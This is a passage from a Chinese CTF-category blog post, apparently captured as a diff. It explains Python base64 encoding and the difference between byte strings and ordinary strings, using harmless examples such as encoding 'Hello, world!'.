+<p>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)这里解释下这个payload<br>1、在python中，base64.b64encode()函数将字节字符串编码为 Base64 字符串，返回的是一个 bytes 类型的对象。<br>2、而 str() 函数用于将对象转换为字符串。因此，我们需要使用 str() 函数将 bytes 类型的对象转换为字符串类型的对象，以便后续的使用。<br>这里举个例字</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># 将字符串编码为 Base64 字符串</span><br>payload = <span class="hljs-string">&quot;Hello, world!&quot;</span><br>base64_payload = base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-built_in">print</span>(base64_payload)  <span class="hljs-comment"># SGVsbG8sIHdvcmxkIQ==</span><br></code></pre></td></tr></table></figure>
+
+<p>在这个例子中，我们使用 <code>decode()</code> 方法将 Base64 编码后的 bytes 对象解码为字符串类型的对象，以便后续的使用</p>
+<h4 id="字节字符串"><a href="#字节字符串" class="headerlink" title="字节字符串"></a>字节字符串</h4><p>在 Python 中，字节字符串（bytes）是一种特殊的数据类型，表示一个由字节序列组成的不可变序列。字节字符串与普通字符串（str）不同的是，它们是以二进制形式存储的，而不是以 Unicode 编码形式存储的。这意味着字节字符串可以包含任意的二进制数据，包括文本、图像、音频等等。而普通字符串则只能包含 Unicode 字符。</p>
+<p>字节字符串可以通过在字符串前加上 <code>b</code> 或 <code>B</code> 来创建，例如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个字节字符串</span><br>bstr = <span class="hljs-string">b&#x27;hello world&#x27;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>在这个例子中，我们使用 b 前缀创建了一个字节字符串，其中包含了 ASCII 编码的字符序列。字节字符串可以使用和普通字符串类似的操作，例如索引、切片、拼接等等。但需要注意的是，字节字符串中的元素是字节（byte），而不是字符（character）。因此，在对字节字符串进行操作时需要使用字节操作符和字节函数。</p>
+<p>再举一个例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;你好vince&quot;</span><br>b = s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-comment">#将字符串“你好vince”转换为字节字符串后，结果是一个字节数组（bytes）对象，其内容为字节序列。具体来说，使用 UTF-8 编码时，每个中文字符占用 3 个字节，每个英文字母占用 1 个字节。</span><br><span class="hljs-string">b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd\x76\x69\x6e\x63\x65&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>\xe4\xbd\xa0\xe5\xa5\xbdvince和b’\xe4\xbd\xa0\xe5\xa5\xbdv\x69\x6e\x63\x65’表示的是一个字节序列</p>
+<p><strong>在 Python 中，如果你想要表示英语字母的字节，可以直接使用字母来表示。因为英文字母在 ASCII 编码中的值是 0 到 127，所以在使用 ASCII 编码时，英文字母的字节表示和它们的字符值是相同的。例如，字母 ‘a’ 的 ASCII 编码值是 97，它的字节表示就是 b’a’。但是，在使用其他编码方式时，英文字母的字节表示可能会不同。例如，在 UTF-8 编码中，英文字母的字节表示通常是一个字节。</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/ctf/%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="category-chain-item">综合攻防世界</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">#文件包含</a>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">#代码执行</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>综合</div>
+      <div>http://example.com/2023/05/29/综合/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zheng Yi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/05/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="代码执行漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">代码执行漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/28/php%E6%95%B0%E7%BB%84/" title="php数组">
+                        <span class="hidden-mobile">php数组</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    
+      <script  src="/js/img-lazyload.js" ></script>
+    
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
